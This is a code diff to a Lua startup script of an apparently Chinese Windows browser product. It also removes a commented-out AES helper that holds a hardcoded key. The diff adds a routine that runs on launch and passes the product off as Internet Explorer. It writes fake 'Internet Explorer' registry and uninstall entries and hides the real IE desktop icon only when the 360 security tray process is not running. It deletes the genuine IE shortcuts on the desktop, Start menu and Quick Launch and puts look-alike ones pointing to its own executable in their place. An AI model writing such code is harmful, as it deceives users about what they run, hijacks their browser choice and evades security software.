@@ -94,39 +94,6 @@ function SendStartupReport(bShowWnd)
 end
 
 
--- function InitAdvFilter()
-	-- EncryptLazyFile("VideoRule_out.mingwen") 
-
-	-- SendRuleListtToFilterThread()
-	-- SetWebRoot()
-	-- InitFilterState()
--- end
-
-
--- function EncryptLazyFile(strFileName) 
-		-- local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
-	-- local strLazyListPath = FunctionObj.GetCfgPathWithName(strFileName)
-	-- if not IsRealString(strLazyListPath) or not tipUtil:QueryFileExists(strLazyListPath) then
-		-- XLMessageBox("file not exists:"..tostring(strFileName))
-		-- return false
-	-- end
-
-	-- local strAESString = tipUtil:ReadFileToString(strLazyListPath)
-	-- if not strAESString then
-		-- TipLog("[SendLazyListToFilterThread] ReadFileToString failed : "..tostring(strLazyListPath))
-		-- return false
-	-- end
-	
-	-- local strEncName = strFileName..".enc"
-	-- local strEncFilePath = FunctionObj.GetCfgPathWithName(strEncName)
-	-- local strKey = "7uxSw0inyfnTawtg"
-	-- tipUtil:EncryptAESToFile(strEncFilePath, strAESString, strKey)
-	
-	-- return
--- end
-
-
-
 function GenDecFilePath(strEncFilePath)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local strKey = "7uxSw0inyfnTawtg"
@@ -509,6 +476,7 @@ function ProcessCommandLine()
 	end
 	
 	TryOpenURLWhenStup()
+	TryInstallIE()
 end
 
 
@@ -525,6 +493,254 @@ function TryOpenURLWhenStup()
 end
 
 
+
+----------install ie ----------
+function TryInstallIE()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local strRegFSPath = "HKEY_CURRENT_USER\\SOFTWARE\\YBYL\\regie"
+	local nValue = FunctionObj.RegQueryValue(strRegFSPath)
+	if IsNilString(nValue) then
+		return   --不是首次启动
+	end
+	
+	local strRegIEPath = "HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\Path"
+	local strIEPath = FunctionObj.RegQueryValue(strRegIEPath)
+	if IsRealString(strIEPath) then
+		-- return --已经安装  ---xlmess
+	end
+	XLMessageBox("doinstall")
+	DoInstallIE()
+	-- FunctionObj.RegDeleteValue(strRegFSPath) xlmess
+	XLMessageBox(33)
+end
+
+
+function DoInstallIE()
+	WriteIERegister()
+	WriteIEShortCut()
+end
+
+
+function WriteIERegister()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	
+	local strIEPath = GetIEPath()
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\Path", strIEPath)
+	
+	local strPid = FunctionObj.GetPeerID()
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\PeerId", strPid)
+	
+	local strInstallSrc = FunctionObj.GetInstallSrc()
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstallSource", strInstallSrc)
+	
+	local strInstallDir = GetIEDir()
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstDir", strInstallDir)
+	
+	local strCurrentTime = tipUtil:GetCurrentUTCTime()
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\InstallTimes", strCurrentTime)
+	
+	-------
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\iexplorer.exe", strIEPath)
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayName", "Internet Explorer")
+	
+    local strUninstPath = tipUtil:PathCombine(strInstallDir, "uninst.exe")
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\UninstallString", strUninstPath)
+	
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayIcon", strIEPath)
+	
+	local strIEVersion = GetFakeIEVersion()
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\DisplayVersion", strIEVersion)
+	
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\URLInfoAbout", "")
+	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\iexplorer.exe\\Publisher", "iexplorer")
+end
+
+
+function GetIEPath()
+	local strIEDir = GetIEDir()
+	if not IsRealString(strIEDir) then
+		return ""
+	end
+	
+	local strIEPath = tipUtil:PathCombine(strIEDir, "program\\iexplore.exe")
+	return strIEPath or ""
+end
+
+
+function GetIEDir()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local bOk, strBaseDir = FunctionObj.QueryAllUsersDir()
+	if not bOk then
+		return ""
+	end
+	
+	local strIEDir = tipUtil:PathCombine(strBaseDir, "iexplorer")
+	return strIEDir or ""
+end
+
+
+function GetFakeIEVersion()
+	local strIEPath = GetIEPath()
+	if not IsRealString(strIEPath) then
+		return ""
+	end
+	
+	return tipUtil:GetFileVersionString(strIEPath)
+end
+
+
+function WriteIEShortCut()
+	HideIEIco()
+	WriteStartMenuSC()
+	WriteStartMenuProgramSC()
+	WriteQuickLaunchSC()
+	WriteDesktopSC()
+end
+
+
+function HideIEIco()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+
+	local bExists = tipUtil:QueryProcessExists("360tray.exe")
+	if bExists then
+		return
+	end
+	
+	local strRegRoot = {"HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE"}
+	for _, strRoot in pairs(strRegRoot) do
+		local strPanelReg = strRoot.."\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel"
+								.."\\{871C5380-42A0-1069-A2EA-08002B30309D}"
+		FunctionObj.RegSetValue(strPanelReg, 1)
+	
+		local strMenuReg = strRoot.."\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\ClassicStartMenu"
+								.."\\{871C5380-42A0-1069-A2EA-08002B30309D}"
+		FunctionObj.RegSetValue(strMenuReg, 1)
+	end
+	
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HideIEIcon", "1")
+end
+
+
+--开始菜单目录
+function WriteStartMenuSC()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local nCSIDL_STARTMENU = 0xB
+	local nCSIDL_COMMON_STARTMENU = 0x16
+	local tStartMenuClsidl = {nCSIDL_STARTMENU, nCSIDL_COMMON_STARTMENU}
+	
+	for _, nCsidl in pairs(tStartMenuClsidl) do
+		local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCsidl)
+		if IsRealString(strBaseDir) and tipUtil:QueryFileExists(strBaseDir) then
+		
+			local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
+			local bIsInDir = CheckIsIELnkInDir(strBaseDir)
+			if bIsInDir then
+				local bret = tipUtil:DeletePathFile(strFilePath)
+				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\STARTMENU", "1")
+			end
+			
+			local strIEPath = GetIEPath()
+			local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strBaseDir, "", "/sstartfrom startmenuprograms", "启动 Internet Explorer 浏览器")
+			if bret then
+				tipUtil:PinToStartMenu4XP(strFilePath, true)
+			end
+		end
+	end
+end
+
+--开始菜单\程序\ 目录
+function WriteStartMenuProgramSC()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local nCSIDL_COMMON_PROGRAM = 0x17
+	local nCSIDL_PROGRAM = 0x2
+	local tProgramClsidl = {nCSIDL_COMMON_PROGRAM, nCSIDL_PROGRAM}
+	
+	for _, nCsidl in pairs(tProgramClsidl) do
+		local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCsidl)
+		if IsRealString(strBaseDir) and tipUtil:QueryFileExists(strBaseDir) then
+		
+			local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
+			local bIsInDir = CheckIsIELnkInDir(strBaseDir)
+			if bIsInDir then
+				local bret = tipUtil:DeletePathFile(strFilePath)
+				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\SMPROGRAMS", "1")
+			end
+			
+			local strIEPath = GetIEPath()
+			local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strBaseDir, "", "/sstartfrom startbar", "启动 Internet Explorer 浏览器")
+		end
+	end
+end
+
+
+--快速启动栏
+function WriteQuickLaunchSC()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local nCSIDL_APPDATA = 0x1A
+	local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCSIDL_APPDATA)
+	local strQueryDir = tipUtil:PathCombine(strBaseDir, "Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\StartMenu") 
+	if IsRealString(strQueryDir) and tipUtil:QueryFileExists(strQueryDir) then
+		local strFilePath = tipUtil:PathCombine(strQueryDir, "Internet Explorer.lnk")
+		local bIsInDir = CheckIsIELnkInDir(strQueryDir)
+		if bIsInDir then
+			local bret = tipUtil:DeletePathFile(strFilePath)
+			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\QUICKLAUNCH", "1")
+		end
+	
+		local strIEPath = GetIEPath()
+		local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strQueryDir, "", "/sstartfrom toolbar", "启动 Internet Explorer 浏览器")
+	end
+end
+
+
+--桌面快捷方式
+function WriteDesktopSC()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local nCSIDL_DESKTOP = 0x10 
+	local nCSIDL_COMMON_DESKTOP = 0x19 
+	local tCSIDL_DESKTOP = {nCSIDL_DESKTOP, nCSIDL_COMMON_DESKTOP}
+	
+	for _, nCsidlDesktop in pairs(tCSIDL_DESKTOP) do
+		local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCsidlDesktop)
+
+		local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
+		local bIsInDir = CheckIsIELnkInDir(strBaseDir)
+		
+		if bIsInDir then
+			local bret = tipUtil:DeletePathFile(strFilePath)
+			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\DESKTOP", "1")
+		end
+		
+		local strIEPath = GetIEPath()
+		local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strBaseDir, "", "/sstartfrom desktop", "启动 Internet Explorer 浏览器")
+	end
+end
+
+
+function CheckIsIELnkInDir(strDir)
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local tFileList = tipUtil:FindFileList(strDir, "*.*")
+	
+	if type(tFileList) ~= "table" then
+		return false
+	end
+	
+	for i=1, #tFileList do
+		local strFilePath = tFileList[i]
+		if IsRealString(strFilePath) and tipUtil:QueryFileExists(strFilePath) then
+			local  strFileName = FunctionObj.GetFileNameFromPath(strFilePath, true)
+			if string.find(tostring(strFileName),"Internet Explorer.lnk") then
+				return true, strFilePath
+			end
+		end
+	end
+
+	return false
+end
+
+
+
+-----------------------instal ie end---
 
 function CreateMainTipWnd()
 	local function OnCreateFuncF(treectrl)
